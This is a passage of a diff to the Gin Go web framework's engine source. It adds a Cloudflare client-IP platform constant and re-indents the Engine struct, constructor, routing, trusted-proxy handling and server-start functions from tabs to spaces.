CF-Connecting-IP for determining\n+        // the client's IP\n+        PlatformCloudflare = \"CF-Connecting-IP\"\n )\n \n // Engine is the framework's instance, it contains the muxer, middleware and configuration settings.\n // Create an instance of Engine, by using New() or Default()\n type Engine struct {\n-\tRouterGroup\n-\n-\t// RedirectTrailingSlash enables automatic redirection if the current route can't be matched but a\n-\t// handler for the path with (without) the trailing slash exists.\n-\t// For example if /foo/ is requested but a route only exists for /foo, the\n-\t// client is redirected to /foo with http status code 301 for GET requests\n-\t// and 307 for all other request methods.\n-\tRedirectTrailingSlash bool\n-\n-\t// RedirectFixedPath if enabled, the router tries to fix the current request path, if no\n-\t// handle is registered for it.\n-\t// First superfluous path elements like ../ or // are removed.\n-\t// Afterwards the router does a case-insensitive lookup of the cleaned path.\n-\t// If a handle can be found for this route, the router makes a redirection\n-\t// to the corrected path with status code 301 for GET requests and 307 for\n-\t// all other request methods.\n-\t// For example /FOO and /..//Foo could be redirected to /foo.\n-\t// RedirectTrailingSlash is independent of this option.\n-\tRedirectFixedPath bool\n-\n-\t// HandleMethodNotAllowed if enabled, the router checks if another method is allowed for the\n-\t// current route, if the current request can not be routed.\n-\t// If this is the case, the request is answered with 'Method Not Allowed'\n-\t// and HTTP status code 405.\n-\t// If no other Method is allowed, the request is delegated to the NotFound\n-\t// handler.\n-\tHandleMethodNotAllowed bool\n-\n-\t// ForwardedByClientIP if enabled, client IP will be parsed from the request's headers that\n-\t// match those stored at `(*gin.Engine).RemoteIPHeaders`. If no IP was\n-\t// fetched, it falls back to the IP obtained from\n-\t// `(*gin.Context).Request.RemoteAddr`.\n-\tForwardedByClientIP bool\n-\n-\t// AppEngine was deprecated.\n-\t// Deprecated: USE `TrustedPlatform` WITH VALUE `gin.PlatformGoogleAppEngine` INSTEAD\n-\t// #726 #755 If enabled, it will trust some headers starting with\n-\t// 'X-AppEngine...' for better integration with that PaaS.\n-\tAppEngine bool\n-\n-\t// UseRawPath if enabled, the url.RawPath will be used to find parameters.\n-\tUseRawPath bool\n-\n-\t// UnescapePathValues if true, the path value will be unescaped.\n-\t// If UseRawPath is false (by default), the UnescapePathValues effectively is true,\n-\t// as url.Path gonna be used, which is already unescaped.\n-\tUnescapePathValues bool\n-\n-\t// RemoveExtraSlash a parameter can be parsed from the URL even with extra slashes.\n-\t// See the PR #1817 and issue #1644\n-\tRemoveExtraSlash bool\n-\n-\t// RemoteIPHeaders list of headers used to obtain the client IP when\n-\t// `(*gin.Engine).ForwardedByClientIP` is `true` and\n-\t// `(*gin.Context).Request.RemoteAddr` is matched by at least one of the\n-\t// network origins of list defined by `(*gin.Engine).SetTrustedProxies()`.\n-\tRemoteIPHeaders []string\n-\n-\t// TrustedPlatform if set to a constant of value gin.Platform*, trusts the headers set by\n-\t// that platform, for example to determine the client IP\n-\tTrustedPlatform string\n-\n-\t// MaxMultipartMemory value of 'maxMemory' param that is given to http.Request's ParseMultipartForm\n-\t// method call.\n-\tMaxMultipartMemory int64\n-\n-\t// UseH2C enable h2c support.\n-\tUseH2C bool\n-\n-\t// ContextWithFallback enable fallback Context.Deadline(), Context.Done(), Context.Err() and Context.Value() when Context.Request.Context() is not nil.\n-\tContextWithFallback bool\n-\n-\tdelims           render.Delims\n-\tsecureJSONPrefix string\n-\tHTMLRender       render.HTMLRender\n-\tFuncMap          template.FuncMap\n-\tallNoRoute       HandlersChain\n-\tallNoMethod      HandlersChain\n-\tnoRoute          HandlersChain\n-\tnoMethod         HandlersChain\n-\tpool             sync.Pool\n-\ttrees            methodTrees\n-\tmaxParams        uint16\n-\tmaxSections      uint16\n-\ttrustedProxies   []string\n-\ttrustedCIDRs     []*net.IPNet\n+        RouterGroup\n+\n+        // RedirectTrailingSlash enables automatic redirection if the current route can't be matched but a\n+        // handler for the path with (without) the trailing slash exists.\n+        // For example if /foo/ is requested but a route only exists for /foo, the\n+        // client is redirected to /foo with http status code 301 for GET requests\n+        // and 307 for all other request methods.\n+        RedirectTrailingSlash bool\n+\n+        // RedirectFixedPath if enabled, the router tries to fix the current request path, if no\n+        // handle is registered for it.\n+        // First superfluous path elements like ../ or // are removed.\n+        // Afterwards the router does a case-insensitive lookup of the cleaned path.\n+        // If a handle can be found for this route, the router makes a redirection\n+        // to the corrected path with status code 301 for GET requests and 307 for\n+        // all other request methods.\n+        // For example /FOO and /..//Foo could be redirected to /foo.\n+        // RedirectTrailingSlash is independent of this option.\n+        RedirectFixedPath bool\n+\n+        // HandleMethodNotAllowed if enabled, the router checks if another method is allowed for the\n+        // current route, if the current request can not be routed.\n+        // If this is the case, the request is answered with 'Method Not Allowed'\n+        // and HTTP status code 405.\n+        // If no other Method is allowed, the request is delegated to the NotFound\n+        // handler.\n+        HandleMethodNotAllowed bool\n+\n+        // ForwardedByClientIP if enabled, client IP will be parsed from the request's headers that\n+        // match those stored at `(*gin.Engine).RemoteIPHeaders`. If no IP was\n+        // fetched, it falls back to the IP obtained from\n+        // `(*gin.Context).Request.RemoteAddr`.\n+        ForwardedByClientIP bool\n+\n+        // AppEngine was deprecated.\n+        // Deprecated: USE `TrustedPlatform` WITH VALUE `gin.PlatformGoogleAppEngine` INSTEAD\n+        // #726 #755 If enabled, it will trust some headers starting with\n+        // 'X-AppEngine...' for better integration with that PaaS.\n+        AppEngine bool\n+\n+        // UseRawPath if enabled, the url.RawPath will be used to find parameters.\n+        UseRawPath bool\n+\n+        // UnescapePathValues if true, the path value will be unescaped.\n+        // If UseRawPath is false (by default), the UnescapePathValues effectively is true,\n+        // as url.Path gonna be used, which is already unescaped.\n+        UnescapePathValues bool\n+\n+        // RemoveExtraSlash a parameter can be parsed from the URL even with extra slashes.\n+        // See the PR #1817 and issue #1644\n+        RemoveExtraSlash bool\n+\n+        // RemoteIPHeaders list of headers used to obtain the client IP when\n+        // `(*gin.Engine).ForwardedByClientIP` is `true` and\n+        // `(*gin.Context).Request.RemoteAddr` is matched by at least one of the\n+        // network origins of list defined by `(*gin.Engine).SetTrustedProxies()`.\n+        RemoteIPHeaders []string\n+\n+        // TrustedPlatform if set to a constant of value gin.Platform*, trusts the headers set by\n+        // that platform, for example to determine the client IP\n+        TrustedPlatform string\n+\n+        // MaxMultipartMemory value of 'maxMemory' param that is given to http.Request's ParseMultipartForm\n+        // method call.\n+        MaxMultipartMemory int64\n+\n+        // UseH2C enable h2c support.\n+        UseH2C bool\n+\n+        // ContextWithFallback enable fallback Context.Deadline(), Context.Done(), Context.Err() and Context.Value() when Context.Request.Context() is not nil.\n+        ContextWithFallback bool\n+\n+        delims           render.Delims\n+        secureJSONPrefix string\n+        HTMLRender       render.HTMLRender\n+        FuncMap          template.FuncMap\n+        allNoRoute       HandlersChain\n+        allNoMethod      HandlersChain\n+        noRoute          HandlersChain\n+        noMethod         HandlersChain\n+        pool             sync.Pool\n+        trees            methodTrees\n+        maxParams        uint16\n+        maxSections      uint16\n+        trustedProxies   []string\n+        trustedCIDRs     []*net.IPNet\n }\n \n var _ IRouter = (*Engine)(nil)\n@@ -178,239 +178,239 @@ var _ IRouter = (*Engine)(nil)\n // - UseRawPath:             false\n // - UnescapePathValues:     true\n func New() *Engine {\n-\tdebugPrintWARNINGNew()\n-\tengine := &Engine{\n-\t\tRouterGroup: RouterGroup{\n-\t\t\tHandlers: nil,\n-\t\t\tbasePath: \"/\",\n-\t\t\troot:     true,\n-\t\t},\n-\t\tFuncMap:                template.FuncMap{},\n-\t\tRedirectTrailingSlash:  true,\n-\t\tRedirectFixedPath:      false,\n-\t\tHandleMethodNotAllowed: false,\n-\t\tForwardedByClientIP:    true,\n-\t\tRemoteIPHeaders:        []string{\"X-Forwarded-For\", \"X-Real-IP\"},\n-\t\tTrustedPlatform:        defaultPlatform,\n-\t\tUseRawPath:             false,\n-\t\tRemoveExtraSlash:       false,\n-\t\tUnescapePathValues:     true,\n-\t\tMaxMultipartMemory:     defaultMultipartMemory,\n-\t\ttrees:                  make(methodTrees, 0, 9),\n-\t\tdelims:                 render.Delims{Left: \"{{\", Right: \"}}\"},\n-\t\tsecureJSONPrefix:       \"while(1);\",\n-\t\ttrustedProxies:         []string{\"0.0.0.0/0\", \"::/0\"},\n-\t\ttrustedCIDRs:           defaultTrustedCIDRs,\n-\t}\n-\tengine.RouterGroup.engine = engine\n-\tengine.pool.New = func() any {\n-\t\treturn engine.allocateContext(engine.maxParams)\n-\t}\n-\treturn engine\n+        debugPrintWARNINGNew()\n+        engine := &Engine{\n+                RouterGroup: RouterGroup{\n+                        Handlers: nil,\n+                        basePath: \"/\",\n+                        root:     true,\n+                },\n+                FuncMap:                template.FuncMap{},\n+                RedirectTrailingSlash:  true,\n+                RedirectFixedPath:      false,\n+                HandleMethodNotAllowed: false,\n+                ForwardedByClientIP:    true,\n+                RemoteIPHeaders:        []string{\"X-Forwarded-For\", \"X-Real-IP\"},\n+                TrustedPlatform:        defaultPlatform,\n+                UseRawPath:             false,\n+                RemoveExtraSlash:       false,\n+                UnescapePathValues:     true,\n+                MaxMultipartMemory:     defaultMultipartMemory,\n+                trees:                  make(methodTrees, 0, 9),\n+                delims:                 render.Delims{Left: \"{{\", Right: \"}}\"},\n+                secureJSONPrefix:       \"while(1);\",\n+                trustedProxies:         []string{\"0.0.0.0/0\", \"::/0\"},\n+                trustedCIDRs:           defaultTrustedCIDRs,\n+        }\n+        engine.RouterGroup.engine = engine\n+        engine.pool.New = func() any {\n+                return engine.allocateContext(engine.maxParams)\n+        }\n+        return engine\n }\n \n // Default returns an Engine instance with the Logger and Recovery middleware already attached.\n func Default() *Engine {\n-\tdebugPrintWARNINGDefault()\n-\tengine := New()\n-\tengine.Use(Logger(), Recovery())\n-\treturn engine\n+        debugPrintWARNINGDefault()\n+        engine := New()\n+        engine.Use(Logger(), Recovery())\n+        return engine\n }\n \n func (engine *Engine) Handler() http.Handler {\n-\tif !engine.UseH2C {\n-\t\treturn engine\n-\t}\n+        if !engine.UseH2C {\n+                return engine\n+        }\n \n-\th2s := &http2.Server{}\n-\treturn h2c.NewHandler(engine, h2s)\n+        h2s := &http2.Server{}\n+        return h2c.NewHandler(engine, h2s)\n }\n \n func (engine *Engine) allocateContext(maxParams uint16) *Context {\n-\tv := make(Params, 0, maxParams)\n-\tskippedNodes := make([]skippedNode, 0, engine.maxSections)\n-\treturn &Context{engine: engine, params: &v, skippedNodes: &skippedNodes}\n+        v := make(Params, 0, maxParams)\n+        skippedNodes := make([]skippedNode, 0, engine.maxSections)\n+        return &Context{engine: engine, params: &v, skippedNodes: &skippedNodes}\n }\n \n // Delims sets template left and right delims and returns an Engine instance.\n func (engine *Engine) Delims(left, right string) *Engine {\n-\tengine.delims = render.Delims{Left: left, Right: right}\n-\treturn engine\n+        engine.delims = render.Delims{Left: left, Right: right}\n+        return engine\n }\n \n // SecureJsonPrefix sets the secureJSONPrefix used in Context.SecureJSON.\n func (engine *Engine) SecureJsonPrefix(prefix string) *Engine {\n-\tengine.secureJSONPrefix = prefix\n-\treturn engine\n+        engine.secureJSONPrefix = prefix\n+        return engine\n }\n \n // LoadHTMLGlob loads HTML files identified by glob pattern\n // and associates the result with HTML renderer.\n func (engine *Engine) LoadHTMLGlob(pattern string) {\n-\tleft := engine.delims.Left\n-\tright := engine.delims.Right\n-\ttempl := template.Must(template.New(\"\").Delims(left, right).Funcs(engine.FuncMap).ParseGlob(pattern))\n+        left := engine.delims.Left\n+        right := engine.delims.Right\n+        templ := template.Must(template.New(\"\").Delims(left, right).Funcs(engine.FuncMap).ParseGlob(pattern))\n \n-\tif IsDebugging() {\n-\t\tdebugPrintLoadTemplate(templ)\n-\t\tengine.HTMLRender = render.HTMLDebug{Glob: pattern, FuncMap: engine.FuncMap, Delims: engine.delims}\n-\t\treturn\n-\t}\n+        if IsDebugging() {\n+                debugPrintLoadTemplate(templ)\n+                engine.HTMLRender = render.HTMLDebug{Glob: pattern, FuncMap: engine.FuncMap, Delims: engine.delims}\n+                return\n+        }\n \n-\tengine.SetHTMLTemplate(templ)\n+        engine.SetHTMLTemplate(templ)\n }\n \n // LoadHTMLFiles loads a slice of HTML files\n // and associates the result with HTML renderer.\n func (engine *Engine) LoadHTMLFiles(files ...string) {\n-\tif IsDebugging() {\n-\t\tengine.HTMLRender = render.HTMLDebug{Files: files, FuncMap: engine.FuncMap, Delims: engine.delims}\n-\t\treturn\n-\t}\n+        if IsDebugging() {\n+                engine.HTMLRender = render.HTMLDebug{Files: files, FuncMap: engine.FuncMap, Delims: engine.delims}\n+                return\n+        }\n \n-\ttempl := template.Must(template.New(\"\").Delims(engine.delims.Left, engine.delims.Right).Funcs(engine.FuncMap).ParseFiles(files...))\n-\tengine.SetHTMLTemplate(templ)\n+        templ := template.Must(template.New(\"\").Delims(engine.delims.Left, engine.delims.Right).Funcs(engine.FuncMap).ParseFiles(files...))\n+        engine.SetHTMLTemplate(templ)\n }\n \n // SetHTMLTemplate associate a template with HTML renderer.\n func (engine *Engine) SetHTMLTemplate(templ *template.Template) {\n-\tif len(engine.trees) > 0 {\n-\t\tdebugPrintWARNINGSetHTMLTemplate()\n-\t}\n+        if len(engine.trees) > 0 {\n+                debugPrintWARNINGSetHTMLTemplate()\n+        }\n \n-\tengine.HTMLRender = render.HTMLProduction{Template: templ.Funcs(engine.FuncMap)}\n+        engine.HTMLRender = render.HTMLProduction{Template: templ.Funcs(engine.FuncMap)}\n }\n \n // SetFuncMap sets the FuncMap used for template.FuncMap.\n func (engine *Engine) SetFuncMap(funcMap template.FuncMap) {\n-\tengine.FuncMap = funcMap\n+        engine.FuncMap = funcMap\n }\n \n // NoRoute adds handlers for NoRoute. It returns a 404 code by default.\n func (engine *Engine) NoRoute(handlers ...HandlerFunc) {\n-\tengine.noRoute = handlers\n-\tengine.rebuild404Handlers()\n+        engine.noRoute = handlers\n+        engine.rebuild404Handlers()\n }\n \n // NoMethod sets the handlers called when Engine.HandleMethodNotAllowed = true.\n func (engine *Engine) NoMethod(handlers ...HandlerFunc) {\n-\tengine.noMethod = handlers\n-\tengine.rebuild405Handlers()\n+        engine.noMethod = handlers\n+        engine.rebuild405Handlers()\n }\n \n // Use attaches a global middleware to the router. i.e. the middleware attached through Use() will be\n // included in the handlers chain for every single request. Even 404, 405, static files...\n // For example, this is the right place for a logger or error management middleware.\n func (engine *Engine) Use(middleware ...HandlerFunc) IRoutes {\n-\tengine.RouterGroup.Use(middleware...)\n-\tengine.rebuild404Handlers()\n-\tengine.rebuild405Handlers()\n-\treturn engine\n+        engine.RouterGroup.Use(middleware...)\n+        engine.rebuild404Handlers()\n+        engine.rebuild405Handlers()\n+        return engine\n }\n \n func (engine *Engine) rebuild404Handlers() {\n-\tengine.allNoRoute = engine.combineHandlers(engine.noRoute)\n+        engine.allNoRoute = engine.combineHandlers(engine.noRoute)\n }\n \n func (engine *Engine) rebuild405Handlers() {\n-\tengine.allNoMethod = engine.combineHandlers(engine.noMethod)\n+        engine.allNoMethod = engine.combineHandlers(engine.noMethod)\n }\n \n func (engine *Engine) addRoute(method, path string, handlers HandlersChain) {\n-\tassert1(path[0] == '/', \"path must begin with '/'\")\n-\tassert1(method != \"\", \"HTTP method can not be empty\")\n-\tassert1(len(handlers) > 0, \"there must be at least one handler\")\n+        assert1(path[0] == '/', \"path must begin with '/'\")\n+        assert1(method != \"\", \"HTTP method can not be empty\")\n+        assert1(len(handlers) > 0, \"there must be at least one handler\")\n \n-\tdebugPrintRoute(method, path, handlers)\n+        debugPrintRoute(method, path, handlers)\n \n-\troot := engine.trees.get(method)\n-\tif root == nil {\n-\t\troot = new(node)\n-\t\troot.fullPath = \"/\"\n-\t\tengine.trees = append(engine.trees, methodTree{method: method, root: root})\n-\t}\n-\troot.addRoute(path, handlers)\n+        root := engine.trees.get(method)\n+        if root == nil {\n+                root = new(node)\n+                root.fullPath = \"/\"\n+                engine.trees = append(engine.trees, methodTree{method: method, root: root})\n+        }\n+        root.addRoute(path, handlers)\n \n-\t// Update maxParams\n-\tif paramsCount := countParams(path); paramsCount > engine.maxParams {\n-\t\tengine.maxParams = paramsCount\n-\t}\n+        // Update maxParams\n+        if paramsCount := countParams(path); paramsCount > engine.maxParams {\n+                engine.maxParams = paramsCount\n+        }\n \n-\tif sectionsCount := countSections(path); sectionsCount > engine.maxSections {\n-\t\tengine.maxSections = sectionsCount\n-\t}\n+        if sectionsCount := countSections(path); sectionsCount > engine.maxSections {\n+                engine.maxSections = sectionsCount\n+        }\n }\n \n // Routes returns a slice of registered routes, including some useful information, such as:\n // the http method, path and the handler name.\n func (engine *Engine) Routes() (routes RoutesInfo) {\n-\tfor _, tree := range engine.trees {\n-\t\troutes = iterate(\"\", tree.method, routes, tree.root)\n-\t}\n-\treturn routes\n+        for _, tree := range engine.trees {\n+                routes = iterate(\"\", tree.method, routes, tree.root)\n+        }\n+        return routes\n }\n \n func iterate(path, method string, routes RoutesInfo, root *node) RoutesInfo {\n-\tpath += root.path\n-\tif len(root.handlers) > 0 {\n-\t\thandlerFunc := root.handlers.Last()\n-\t\troutes = append(routes, RouteInfo{\n-\t\t\tMethod:      method,\n-\t\t\tPath:        path,\n-\t\t\tHandler:     nameOfFunction(handlerFunc),\n-\t\t\tHandlerFunc: handlerFunc,\n-\t\t})\n-\t}\n-\tfor _, child := range root.children {\n-\t\troutes = iterate(path, method, routes, child)\n-\t}\n-\treturn routes\n+        path += root.path\n+        if len(root.handlers) > 0 {\n+                handlerFunc := root.handlers.Last()\n+                routes = append(routes, RouteInfo{\n+                        Method:      method,\n+                        Path:        path,\n+                        Handler:     nameOfFunction(handlerFunc),\n+                        HandlerFunc: handlerFunc,\n+                })\n+        }\n+        for _, child := range root.children {\n+                routes = iterate(path, method, routes, child)\n+        }\n+        return routes\n }\n \n // Run attaches the router to a http.Server and starts listening and serving HTTP requests.\n // It is a shortcut for http.ListenAndServe(addr, router)\n // Note: this method will block the calling goroutine indefinitely unless an error happens.\n func (engine *Engine) Run(addr ...string) (err error) {\n-\tdefer func() { debugPrintError(err) }()\n+        defer func() { debugPrintError(err) }()\n \n-\tif engine.isUnsafeTrustedProxies() {\n-\t\tdebugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n-\t\t\t\"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n-\t}\n+        if engine.isUnsafeTrustedProxies() {\n+                debugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n+                        \"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n+        }\n \n-\taddress := resolveAddress(addr)\n-\tdebugPrint(\"Listening and serving HTTP on %s\\n\", address)\n-\terr = http.ListenAndServe(address, engine.Handler())\n-\treturn\n+        address := resolveAddress(addr)\n+        debugPrint(\"Listening and serving HTTP on %s\\n\", address)\n+        err = http.ListenAndServe(address, engine.Handler())\n+        return\n }\n \n func (engine *Engine) prepareTrustedCIDRs() ([]*net.IPNet, error) {\n-\tif engine.trustedProxies == nil {\n-\t\treturn nil, nil\n-\t}\n-\n-\tcidr := make([]*net.IPNet, 0, len(engine.trustedProxies))\n-\tfor _, trustedProxy := range engine.trustedProxies {\n-\t\tif !strings.Contains(trustedProxy, \"/\") {\n-\t\t\tip := parseIP(trustedProxy)\n-\t\t\tif ip == nil {\n-\t\t\t\treturn cidr, &net.ParseError{Type: \"IP address\", Text: trustedProxy}\n-\t\t\t}\n-\n-\t\t\tswitch len(ip) {\n-\t\t\tcase net.IPv4len:\n-\t\t\t\ttrustedProxy += \"/32\"\n-\t\t\tcase net.IPv6len:\n-\t\t\t\ttrustedProxy += \"/128\"\n-\t\t\t}\n-\t\t}\n-\t\t_, cidrNet, err := net.ParseCIDR(trustedProxy)\n-\t\tif err != nil {\n-\t\t\treturn cidr, err\n-\t\t}\n-\t\tcidr = append(cidr, cidrNet)\n-\t}\n-\treturn cidr, nil\n+        if engine.trustedProxies == nil {\n+                return nil, nil\n+        }\n+\n+        cidr := make([]*net.IPNet, 0, len(engine.trustedProxies))\n+        for _, trustedProxy := range engine.trustedProxies {\n+                if !strings.Contains(trustedProxy, \"/\") {\n+                        ip := parseIP(trustedProxy)\n+                        if ip == nil {\n+                                return cidr, &net.ParseError{Type: \"IP address\", Text: trustedProxy}\n+                        }\n+\n+                        switch len(ip) {\n+                        case net.IPv4len:\n+                                trustedProxy += \"/32\"\n+                        case net.IPv6len:\n+                                trustedProxy += \"/128\"\n+                        }\n+                }\n+                _, cidrNet, err := net.ParseCIDR(trustedProxy)\n+                if err != nil {\n+                        return cidr, err\n+                }\n+                cidr = append(cidr, cidrNet)\n+        }\n+        return cidr, nil\n }\n \n // SetTrustedProxies set a list of network origins (IPv4 addresses,\n@@ -422,287 +422,287 @@ func (engine *Engine) prepareTrustedCIDRs() ([]*net.IPNet, error) {\n // Engine.SetTrustedProxies(nil), then Context.ClientIP() will\n // return the remote address directly.\n func (engine *Engine) SetTrustedProxies(trustedProxies []string) error {\n-\tengine.trustedProxies = trustedProxies\n-\treturn engine.parseTrustedProxies()\n+        engine.trustedProxies = trustedProxies\n+        return engine.parseTrustedProxies()\n }\n \n // isUnsafeTrustedProxies checks if Engine.trustedCIDRs contains all IPs, it's not safe if it has (returns true)\n func (engine *Engine) isUnsafeTrustedProxies() bool {\n-\treturn engine.isTrustedProxy(net.ParseIP(\"0.0.0.0\")) || engine.isTrustedProxy(net.ParseIP(\"::\"))\n+        return engine.isTrustedProxy(net.ParseIP(\"0.0.0.0\")) || engine.isTrustedProxy(net.ParseIP(\"::\"))\n }\n \n // parseTrustedProxies parse Engine.trustedProxies to Engine.trustedCIDRs\n func (engine *Engine) parseTrustedProxies() error {\n-\ttrustedCIDRs, err := engine.prepareTrustedCIDRs()\n-\tengine.trustedCIDRs = trustedCIDRs\n-\treturn err\n+        trustedCIDRs, err := engine.prepareTrustedCIDRs()\n+        engine.trustedCIDRs = trustedCIDRs\n+        return err\n }\n \n // isTrustedProxy will check whether the IP address is included in the trusted list according to Engine.trustedCIDRs\n func (engine *Engine) isTrustedProxy(ip net.IP) bool {\n-\tif engine.trustedCIDRs == nil {\n-\t\treturn false\n-\t}\n-\tfor _, cidr := range engine.trustedCIDRs {\n-\t\tif cidr.Contains(ip) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        if engine.trustedCIDRs == nil {\n+                return false\n+        }\n+        for _, cidr := range engine.trustedCIDRs {\n+                if cidr.Contains(ip) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n // validateHeader will parse X-Forwarded-For header and return the trusted client IP address\n func (engine *Engine) validateHeader(header string) (clientIP string, valid bool) {\n-\tif header == \"\" {\n-\t\treturn \"\", false\n-\t}\n-\titems := strings.Split(header, \",\")\n-\tfor i := len(items) - 1; i >= 0; i-- {\n-\t\tipStr := strings.TrimSpace(items[i])\n-\t\tip := net.ParseIP(ipStr)\n-\t\tif ip == nil {\n-\t\t\tbreak\n-\t\t}\n-\n-\t\t// X-Forwarded-For is appended by proxy\n-\t\t// Check IPs in reverse order and stop when find untrusted proxy\n-\t\tif (i == 0) || (!engine.isTrustedProxy(ip)) {\n-\t\t\treturn ipStr, true\n-\t\t}\n-\t}\n-\treturn \"\", false\n+        if header == \"\" {\n+                return \"\", false\n+        }\n+        items := strings.Split(header, \",\")\n+        for i := len(items) - 1; i >= 0; i-- {\n+                ipStr := strings.TrimSpace(items[i])\n+                ip := net.ParseIP(ipStr)\n+                if ip == nil {\n+                        break\n+                }\n+\n+                // X-Forwarded-For is appended by proxy\n+                // Check IPs in reverse order and stop when find untrusted proxy\n+                if (i == 0) || (!engine.isTrustedProxy(ip)) {\n+                        return ipStr, true\n+                }\n+        }\n+        return \"\", false\n }\n \n // parseIP parse a string representation of an IP and returns a net.IP with the\n // minimum byte representation or nil if input is invalid.\n func parseIP(ip string) net.IP {\n-\tparsedIP := net.ParseIP(ip)\n+        parsedIP := net.ParseIP(ip)\n \n-\tif ipv4 := parsedIP.To4(); ipv4 != nil {\n-\t\t// return ip in a 4-byte representation\n-\t\treturn ipv4\n-\t}\n+        if ipv4 := parsedIP.To4(); ipv4 != nil {\n+                // return ip in a 4-byte representation\n+                return ipv4\n+        }\n \n-\t// return ip in a 16-byte representation or nil\n-\treturn parsedIP\n+        // return ip in a 16-byte representation or nil\n+        return parsedIP\n }\n \n // RunTLS attaches the router to a http.Server and starts listening and serving HTTPS (secure) requests.\n // It is a shortcut for http.ListenAndServeTLS(addr, certFile, keyFile, router)\n // Note: this method will block the calling goroutine indefinitely unless an error happens.\n func (engine *Engine) RunTLS(addr, certFile, keyFile string) (err error) {\n-\tdebugPrint(\"Listening and serving HTTPS on %s\\n\", addr)\n-\tdefer func() { debugPrintError(err) }()\n+        debugPrint(\"Listening and serving HTTPS on %s\\n\", addr)\n+        defer func() { debugPrintError(err) }()\n \n-\tif engine.isUnsafeTrustedProxies() {\n-\t\tdebugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n-\t\t\t\"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n-\t}\n+        if engine.isUnsafeTrustedProxies() {\n+                debugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n+                        \"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n+        }\n \n-\terr = http.ListenAndServeTLS(addr, certFile, keyFile, engine.Handler())\n-\treturn\n+        err = http.ListenAndServeTLS(addr, certFile, keyFile, engine.Handler())\n+        return\n }\n \n // RunUnix attaches the router to a http.Server and starts listening and serving HTTP requests\n // through the specified unix socket (i.e. a file).\n // Note: this method will block the calling goroutine indefinitely unless an error happens.\n func (engine *Engine) RunUnix(file string) (err error) {\n-\tdebugPrint(\"Listening and serving HTTP on unix:/%s\", file)\n-\tdefer func() { debugPrintError(err) }()\n+        debugPrint(\"Listening and serving HTTP on unix:/%s\", file)\n+        defer func() { debugPrintError(err) }()\n \n-\tif engine.isUnsafeTrustedProxies() {\n-\t\tdebugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n-\t\t\t\"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n-\t}\n+        if engine.isUnsafeTrustedProxies() {\n+                debugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n+                        \"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n+        }\n \n-\tlistener, err := net.Listen(\"unix\", file)\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\tdefer listener.Close()\n-\tdefer os.Remove(file)\n+        listener, err := net.Listen(\"unix\", file)\n+        if err != nil {\n+                return\n+        }\n+        defer listener.Close()\n+        defer os.Remove(file)\n \n-\terr = http.Serve(listener, engine.Handler())\n-\treturn\n+        err = http.Serve(listener, engine.Handler())\n+        return\n }\n \n // RunFd attaches the router to a http.Server and starts listening and serving HTTP requests\n // through the specified file descriptor.\n // Note: this method will block the calling goroutine indefinitely unless an error happens.\n func (engine *Engine) RunFd(fd int) (err error) {\n-\tdebugPrint(\"Listening and serving HTTP on fd@%d\", fd)\n-\tdefer func() { debugPrintError(err) }()\n+        debugPrint(\"Listening and serving HTTP on fd@%d\", fd)\n+        defer func() { debugPrintError(err) }()\n \n-\tif engine.isUnsafeTrustedProxies() {\n-\t\tdebugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n-\t\t\t\"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n-\t}\n+        if engine.isUnsafeTrustedProxies() {\n+                debugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n+                        \"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n+        }\n \n-\tf := os.NewFile(uintptr(fd), fmt.Sprintf(\"fd@%d\", fd))\n-\tlistener, err := net.FileListener(f)\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\tdefer listener.Close()\n-\terr = engine.RunListener(listener)\n-\treturn\n+        f := os.NewFile(uintptr(fd), fmt.Sprintf(\"fd@%d\", fd))\n+        listener, err := net.FileListener(f)\n+        if err != nil {\n+                return\n+        }\n+        defer listener.Close()\n+        err = engine.RunListener(listener)\n+        return\n }\n \n // RunListener attaches the router to a http.Server and starts listening and serving HTTP requests\n // through the specified net.Listener\n func (engine *Engine) RunListener(listener net.Listener) (err error) {\n-\tdebugPrint(\"Listening and serving HTTP on listener what's bind with address@%s\", listener.Addr())\n-\tdefer func() { debugPrintError(err) }()\n+        debugPrint(\"Listening and serving HTTP on listener what's bind with address@%s\", listener.Addr())\n+        defer func() { debugPrintError(err) }()\n \n-\tif engine.isUnsafeTrustedProxies() {\n-\t\tdebugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n-\t\t\t\"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n-\t}\n+        if engine.isUnsafeTrustedProxies() {\n+                debugPrint(\"[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\" +\n+                        \"Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\")\n+        }\n \n-\terr = http.Serve(listener, engine.Handler())\n-\treturn\n+        err = http.Serve(listener, engine.Handler())\n+        return\n }\n \n // ServeHTTP conforms to the http.Handler interface.\n func (engine *Engine) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n-\tc := 